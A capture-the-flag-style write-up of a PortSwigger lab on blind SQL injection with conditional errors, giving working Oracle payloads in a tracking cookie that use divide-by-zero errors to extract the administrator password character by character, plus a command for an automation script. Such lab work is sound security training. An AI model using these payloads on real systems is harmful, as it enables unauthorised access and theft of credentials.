# Blind SQL injection with conditional errors

**Lab Url**: [https://portswigger.net/web-security/sql-injection/blind/lab-conditional-errors](https://portswigger.net/web-security/sql-injection/blind/lab-conditional-errors)

## Objective

This lab contains a blind SQL injection vulnerability. The application uses a tracking cookie for analytics, and performs a SQL query containing the value of the submitted cookie.

The results of the SQL query are not returned, and the application does not respond any differently based on whether the query returns any rows. If the SQL query causes an error, then the application returns a custom error message.

The database contains a different table called `users`, with columns called `username` and `password`. You need to exploit the blind SQL injection vulnerability to find out the password of the `administrator` user.

To solve the lab, log in as the `administrator` user.

## Solution

The application returns a custom error message when the SQL query encounters an error. We can trigger errors conditionally using a `CASE WHEN` expression with a divide-by-zero (`TO_CHAR(1/0)`) to leak information one bit at a time.

The database is Oracle (identified via `banner FROM v$version`), and the query returns a single column.

### Step 1: Confirm the conditional error technique

The following payload causes a divide-by-zero error only if the `administrator` user exists in the `users` table:

```http
Cookie: TrackingId=' UNION (SELECT CASE WHEN (username='administrator') THEN TO_CHAR(1/0) ELSE NULL END FROM users) --
```

A **500 Internal Server Error** confirms the user exists.

### Step 2: Determine the password length

Test each possible length by adding an `AND LENGTH(password)=N` condition:

```http
Cookie: TrackingId=' UNION (SELECT CASE WHEN (username='administrator' AND LENGTH(password)=N) THEN TO_CHAR(1/0) ELSE NULL END FROM users) --
```

When a `500` error is returned, `N` is the correct length.

### Step 3: Extract the password character by character

Use Oracle's `SUBSTR(password, N, 1)` to test each character at each position:

```http
Cookie: TrackingId=' UNION (SELECT CASE WHEN (username='administrator' AND SUBSTR(password,1,1)='a') THEN TO_CHAR(1/0) ELSE NULL END FROM users) --
Cookie: TrackingId=' UNION (SELECT CASE WHEN (username='administrator' AND SUBSTR(password,2,1)='b') THEN TO_CHAR(1/0) ELSE NULL END FROM users) --
...
```

A `500` error means the guessed character is correct.

### Step 4: Login

Log in as `administrator` with the recovered password to solve the lab.

---

**Automation script:** A Python script is available at [`lab_12_script.py`](./scripts/lab_12_script.py) that automates the entire process:

```bash
python3 lab_12_script.py -u https://LAB-ID.web-security-academy.net/ -s YOUR-SESSION-COOKIE
```
